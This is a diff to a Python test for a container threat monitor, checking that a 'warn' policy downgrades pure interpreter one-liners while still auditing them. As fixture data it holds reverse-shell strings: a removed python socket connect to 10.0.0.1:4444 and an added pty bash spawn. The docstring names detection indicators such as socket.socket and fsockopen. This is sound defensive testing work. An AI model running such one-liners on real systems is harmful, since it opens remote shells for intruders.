@@ -514,18 +514,23 @@ class TestThreatDetection:
     def test_oneliner_warn_policy_downgrades_but_still_audits(
         self, test_workspace, enable_monitoring_oneliner_warn, coi_binary
     ):
-        """With reverse_shell_one_liners = "warn" (#842), a genuine interpreter
-        one-liner reverse shell (socket + IP) is downgraded to WARNING: it is
-        logged and audited but does NOT kill the container. The unambiguous
-        class stays critical (covered by test_interpreter_reverse_shell_still_killed
-        and test_critical_threat_kills_container)."""
+        """With reverse_shell_one_liners = "warn" (#842), a PURE interpreter
+        one-liner (a `python3 -c` carrying only a host:port endpoint, no
+        unambiguous socket indicator) is downgraded to WARNING: it is logged and
+        audited but does NOT kill the container. A one-liner that ALSO carries an
+        unambiguous indicator (socket.socket, fsockopen, ...) stays CRITICAL even
+        under warn — that strong-wins classification is covered by the Go
+        TestReverseShellOneLinerPolicy; the unambiguous class kill path is covered
+        by test_interpreter_reverse_shell_still_killed and
+        test_critical_threat_kills_container."""
         container_name, proc = self._start_shell(test_workspace, coi_binary, 79)
         try:
-            # Real python reverse shell (socket + IP) — one-liner class.
+            # Pure one-liner: matches `python3 -c` and trips the network gate via
+            # a host:port endpoint, but contains NO strong indicator, so it is the
+            # genuinely-downgradeable one-liner class.
             self._inject_faked_process(
                 container_name,
-                "python3 -c import socket,subprocess,os;s=socket.socket();"
-                's.connect(("10.0.0.1",4444))',
+                "python3 -c __import__('pty').spawn('/bin/bash') # 10.0.0.1:4444",
             )
 
             # Give the monitor several poll cycles.
